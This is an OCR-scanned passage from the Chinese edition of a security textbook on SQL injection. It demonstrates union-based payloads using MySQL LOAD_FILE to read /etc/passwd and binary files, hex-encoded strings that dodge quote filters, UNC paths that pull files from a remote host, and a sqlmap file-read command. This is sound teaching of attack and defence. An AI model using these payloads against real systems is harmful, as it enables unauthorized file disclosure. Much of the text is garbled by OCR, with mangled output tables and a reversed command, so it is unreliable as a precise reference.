第6章利用操作系统
Gary Oleary-Steele garyolfakedomain.com 1
Erlend oftedal erlendefakedomain,com 1
Marco Slaviero marcoefakedomain.com 1
Alberto Revelli r0otefakedomain.net 1
Alexander Kornbrust PI:EMAIL 1
Justin Clarke justinefakedomain,com 1
Kevvie Fowler PI:EMAIL 1
接下来在MySQL控制台中运行下列命令，创建一张表来保存作者的详细信息：
mysql> create table authors (fname char (50), sname char (50),
email char(100), flag int);
Query OK, 0 rows affected (0.01 sec)
当表准备好接收文本文件后，使用下列命令填充表：
mysql> load data infile */tmp/users.txt* into table authors fields
terminated by '';
Query OK, 11 rows affected (0.00 sec)
Records: 11 Deleted: 0 Skipped: 0 Warnings: 0
通过快速选择authors表的内容会发现，文本文件已经被完整地导入数据库中：
mysql> select * from authors;
1fname
Isname
Iema i1
ISumit
Siddharth
1sumit.siddharth @fakedomain.com
IDafydd
Hartley
pxeanas
1mailefakedomain.net
Dave
1daveefakedomain, co.uk
Rodrigo
Marcos
rodrigoefakedomain.com
1
1 GaEy
Oleary-Steele 1garyolfakedomain.com
1Marco
1Erlend
Ofteda1
I erlend @fakedomain.com
Slaviero
Imarco8fakedomain. com
IAlberto
Reve11i
1r00tefakedomain.net
1 Alexander 1
Kornbrust
1ak8fakedomain.com
Justin
1Fowler
Clarke
PI:EMAIL
IKevvie
kevviefowler@fakedor
11 rows in set 
(0.00 sec)
为了更加便于使用，MySQL还提供了LOAD_FILE函数，通过该函数可以避免创建表，
直接传递结果即可：
mysq]> select LOAD_FILE(*/tmp/test.txt*);
ILOAD_FILE(*/tmp/test , txt*)
I This is an arbitrary file residing somewhere on the filesystem
It can be multi-line
and it does not really matter how many lines are in it..*
235
---
## Page 250
SQL注入攻击与防御（第2版）
1row in set (0.00 sec)
本书关注的是SQL注入，在注入的SQL语句中观察这些操作会更好些。要进行测试，请
思考一个虚构的易受攻击的内部网网站（如图6-1所示），它允许用户搜索顾客。
A00
MysQu
图6-1易受攻击的内部网应用示例
该站点易受到注入攻击，由于它直接将输出返回给了浏览器，因而这里很适合使用umion
语句。为演示方便，该站点将产生的真正SQL查询显示为DEBUG消息。简单地搜索“a”，
结果如图6-2所示。
e00
MysQu
Search Results
DEBUG:
me like “%a%
Alpha Tailos
ABC Who
Dmega Suret
Sreet, Ho
Beta Soorei
Never Ready Close
ca Place
Barby Doll
198 Pliastiqoe Place
Bnady Bunch Floris
789 Tulip Lanc
图6-2搜索a”后显示的结果
236
---
## Page 251
第6章利用操作系统
现在回想下前面介绍的LOAD_FILE命令的语法。我们将会试使用umion运算符来读取完
全可读的/etc/passwd文件，使用下列代码：
*union select LOAD_FILE (*/etc/passwd*)#
上述代码将返回我们比较熟悉的与umion运算符有关的错误消息—两个查询中的列数要
保持相等：
DBD::mysql::st execute failed: The used SELECT statements have a
different nunber of columns at...
我们再向联合查询添加一列以有效地获取结果，提交的代码如下：
*union select NULL, LOAD_FILE(*/etc/passwd′) #
这跟我们期望的内容完全一样，结果如图6-3所示。服务器返回了数据库中的所有用户以
及我们所请求文件的内容。
MySQu
Search Result
er NULL,LOAD_FILEC/ecipass
wd%
sast
ABC
Aipha
ngx.Soect
aca Placc
Meta
Kever Ready Closc
Pkez
89 Tvlip Late
655343
bin/bmvhbnx2:2:hinb
bin/bin/b sycx:33sys/de:bin/st
eiews/bina
do109:11/apoopooi/lenoc:1010s_/m/sac:/yqbc110:113My5QL
图6-3通过数据库读取/etcpasswd
237
---
## Page 252
SQL注入攻击与防御（第2版）
请记住，这种访问文件系统的方式要求数据库用户拥有File权限，面且所读取的文件要支
持完全可读。在语法上，LOAD_FILE命令要求攻击者使用单引号字符（）。有时应用程序会过
滤可能的恶意字符，这时使用单引号会引发间题。NGS Software公司的 Chris Anley在其论文
“HackProofingMySQL”中指出：MySQL使用十六进制编码字符串替代字符串常量。这意味
着下面两条语句是等价的：
select 'c:/boot.ini*
select 0x633a2f626f6f742e696e69
第7章将介绍关于这种编码攻击的更多信息。
LOAD_FILE函数还能透明地处理二进制文件。这意味着我们可以使用该函数并通过少量
技巧很容易地从远程主机读取二进制文件：
mysql> create table foo (1ine blob) ;
Query OK, 0 rows affected (0.01 sec)
mysq]> insert into foo set 1line=load_file(*/tmp/temp.bin*) ;
Query OK, 1 row affected (0,oo sec)
1line
1AA??A1
1 row in set (0.00 sec)
当然，二进制数据是不可见的，所以我们无法使用它们。不过MySQL使用内置的HEXO
函数为我们提供了补教措施：
mysq1> select HEx(line) from foo;
1HEX (line)
1 414190904112 1
1 rov in set (0.00 sec)
LOAD_FILE命令在封装到HEXO函数中后同样可以工作，这样我们便可以使用易受攻击
的内部网应用程序来从远程文件系统读取二进制文件：
‘union select NULL, HEX (LOAD_FILE (*/tmp/temp -bin′)) 
该查询的结果如图6-4所示。
可以使用substring函数对内容进行拆分，这样一次便可以有效地获取一块二进制文件，从
而克服应用程序可能强加的限制。
238
---
## Page 253
第6章利用操作系统
MySQL
Senrh Rests
aby Dob
 Pacz
图64读取二进制文件
LOAD_FILEO还接收UNC（通用命名约定）路径，这使得有胆量的攻击者可以在其他机器上
搜索文件，甚至可以引导MySQL服务器连接到他们自已的机器：
mysql> select 1oad_fi1e(* //172.16.125.2/temp_smb/test.txt*) ;
11oad_fi1e (*//172.16.125.2/temp_smb/test.txt*) 1
=
I This is a file on a server far far away..
1rov in set (0.52 sec)
Bernardo Damele A.G开发的 Sqlmap 工具(http:/sqlmap.sourceforge.net)通过read-file 命令
行选项提供该功能：
[d*xewosno/utqT5o/euexut//:du e=wxe_ n- Ad·dewbs uoud
Submit=Submit6term=a " ==read-file  /etc/passwd
2. Microsoft SQLServer
Microsoft SQL Server 是Microsoft 安全开发生命周期(Security Development Lifecycle,SD
过程的旗舰产品，尽管如此，它在SQL注入攻击方面也还是存在相当多的负面评价。这一方
面是因为它在初次开发者中的普及程度（一种Microsoft如何招揽开发者的证据），另一方面是因
为MicrosoftSQLServer支持堆叠查询。这会导致潜在攻击者可用的选项数量以指数级增加，
这一点可以从针对 SQLServer工具箱的注入的后果中得到证实。SensePost 已经独自创建了工
具集，可以将注入点转换到完全成熟的DNS隧道中、远程文件服务器中甚至TCP连接代理中。
我们从头开始，尝试使用一个易受攻击的Web应用从远程SQLServer读取文件。对于这
种情况，攻击者（已经获取系统管理员权限）通常首先借用的是BULKINSERT语句。
使用MicrosofSQLQueryAnalyzer（图6-5所示）进行的快速测试以示例方式展示了使用
BULKINSERT的过程。
239
---
## Page 254
SQL注入攻击与防御（第2版）
og- Auanb] - azkeuykanb 10s
eX
REATE TABLE Doof 11me
SELECT line TRos boof
talk
FRON
区
[oot loader]
imeout*30
deu1m1ts c01 dsek 0) de(0) art 1tsom (1)0
[operating systems]
ults (0) dssk (0) rdsek (0) part1t1om (1) \ 9D8r
er"/fastdetect
M]
ochot（0.00（52）m090.00id1:5rsn1,Cl1
Connetons:1
图 6-5SQL Query Analyzer 内的 BULK INSERT
RDBMS（关系型数据库管理系统）以上述方式处理文件的能力，以及处理批查询或堆叠查询